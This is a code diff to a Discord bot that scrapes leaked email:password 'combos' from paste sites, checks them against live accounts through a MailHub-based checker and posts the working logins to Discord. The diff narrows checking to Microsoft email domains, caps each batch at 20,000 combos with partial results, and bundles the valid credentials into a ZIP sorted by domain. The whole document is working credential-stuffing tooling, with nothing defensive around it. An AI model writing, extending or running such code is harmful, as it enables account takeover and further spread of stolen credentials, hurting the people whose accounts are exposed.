@@ -16,7 +16,13 @@ from pathlib import Path
 
 import aiohttp
 import concurrent.futures
+import zipfile
 from mailhub import MailHub
+
+MS_DOMAINS = {"hotmail.com", "outlook.com", "live.com", "msn.com", "hotmail.co.uk",
+              "hotmail.fr", "hotmail.de", "hotmail.it", "hotmail.es", "outlook.co.uk",
+              "live.co.uk", "live.fr", "live.de"}
+CHECKER_LIMIT = 20000  # max combos before posting partial results
 import discord
 from discord.ext import commands, tasks
 from discord import app_commands
@@ -147,24 +153,28 @@ def check_single(combo: str, proxies: list = []) -> tuple[str, str]:
 
 
 async def check_combos(combos: list[str], status_msg=None) -> list[str]:
-    """Run combos through checker in thread pool, return only valid hits."""
+    """Run combos through checker in thread pool, return only valid hits.
+    If over CHECKER_LIMIT, checks first CHECKER_LIMIT and posts partial results."""
     if not combos:
         return []
-    log.info(f"Checking {len(combos)} combos with {CHECKER_THREADS} threads...")
+    partial = len(combos) > CHECKER_LIMIT
+    to_check = combos[:CHECKER_LIMIT] if partial else combos
+    log.info(f"Checking {len(to_check)} combos with {CHECKER_THREADS} threads{' (partial)' if partial else ''}...")
     if status_msg:
         try:
-            await status_msg.edit(content=f"🔄 Checking {len(combos)} combos...")
+            await status_msg.edit(content=f"🔄 Checking {len(to_check)}/{len(combos)} combos{'  (limit reached, posting partial)' if partial else ''}...")
         except Exception:
             pass
-    loop  = asyncio.get_event_loop()
+    loop = asyncio.get_event_loop()
     with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
-        futures = [loop.run_in_executor(pool, check_single, combo) for combo in combos]
+        futures = [loop.run_in_executor(pool, check_single, combo) for combo in to_check]
         results = await asyncio.gather(*futures)
     valid = [combo for combo, status in results if status in ("VALID", "2FA")]
-    log.info(f"Checking done — {len(valid)}/{len(combos)} valid")
+    log.info(f"Checking done — {len(valid)}/{len(to_check)} valid")
     if status_msg:
         try:
-            await status_msg.edit(content=f"✅ {len(valid)} valid hits found from {len(combos)} combos")
+            suffix = " (partial — limit reached)" if partial else ""
+            await status_msg.edit(content=f"✅ {len(valid)} valid hits found from {len(to_check)} combos{suffix}")
         except Exception:
             pass
     return valid
@@ -403,18 +413,48 @@ async def monitor_loop():
                         # Flatten all creds
                         all_raw = [l for b in combined for l in b.splitlines() if l.strip()]
 
-                        # Skip checking for mix files
+                        # Determine label
                         title_lower_check = " ".join(p["title"].lower() for p in new_pastes)
-                        if "mix" in title_lower_check or "mixed" in title_lower_check:
+                        if "hotmail" in title_lower_check:
+                            label = "hotmail"
+                        elif "hits" in title_lower_check:
+                            label = "hits"
+                        elif "mix" in title_lower_check or "mixed" in title_lower_check:
+                            label = "mix"
+                        else:
+                            label = "content"
+
+                        # Skip checking for mix files
+                        if label == "mix":
                             log.info("Mix file detected, skipping checker")
                             valid_hits = all_raw
+                            sorted_zip = None
                         else:
-                            log.info(f"Running {len(all_raw)} combos through checker...")
+                            # Filter to MS domains only before checking
+                            ms_combos    = [c for c in all_raw if ":" in c and c.split(":", 1)[0].split("@")[-1].lower() in MS_DOMAINS]
+                            other_combos = [c for c in all_raw if c not in ms_combos]
+                            log.info(f"Domain filter: {len(ms_combos)} MS / {len(other_combos)} other out of {len(all_raw)}")
+
                             try:
-                                status_msg = await content_channel.send(f"🔄 Checking {len(all_raw)} combos...")
+                                status_msg = await content_channel.send(f"🔄 Checking {len(ms_combos)} MS combos...")
                             except Exception:
                                 status_msg = None
-                            valid_hits = await check_combos(all_raw, status_msg=status_msg)
+                            valid_hits = await check_combos(ms_combos, status_msg=status_msg)
+
+                            # Build sorted-by-domain ZIP
+                            if valid_hits:
+                                domain_map = {}
+                                for combo in valid_hits:
+                                    domain = combo.split(":", 1)[0].split("@")[-1].lower()
+                                    domain_map.setdefault(domain, []).append(combo)
+                                zip_buf = io.BytesIO()
+                                with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                                    for domain, combos_d in domain_map.items():
+                                        zf.writestr(f"{domain}.txt", "\n".join(combos_d))
+                                zip_buf.seek(0)
+                                sorted_zip = zip_buf
+                            else:
+                                sorted_zip = None
 
                         if not valid_hits:
                             log.info("No valid hits after checking, skipping post")
@@ -422,24 +462,15 @@ async def monitor_loop():
                             combined = ["\n".join(valid_hits)]
 
                     if combined:
-                        output      = "\n\n".join(combined)
-                        ts          = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
-                        title_lower = " ".join(p["title"].lower() for p in new_pastes)
-
-                        if "hotmail" in title_lower:
-                            label = "hotmail"
-                        elif "hits" in title_lower:
-                            label = "hits"
-                        elif "mix" in title_lower or "mixed" in title_lower:
-                            label = "mix"
-                        else:
-                            label = "content"
-
+                        output   = "\n\n".join(combined)
                         filename = f"{len(valid_hits)} {label.upper()} VALID.txt"
 
-                        # Discord
+                        # Discord — post full file + ZIP (if not mix)
                         if toggles["discord_content"]:
                             await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
+                            if sorted_zip:
+                                zip_filename = f"{len(valid_hits)} {label.upper()} SORTED.zip"
+                                await content_channel.send(file=discord.File(fp=sorted_zip, filename=zip_filename))
                             log.info(f"Posted to Discord as {filename}")
 
                         # DM owner
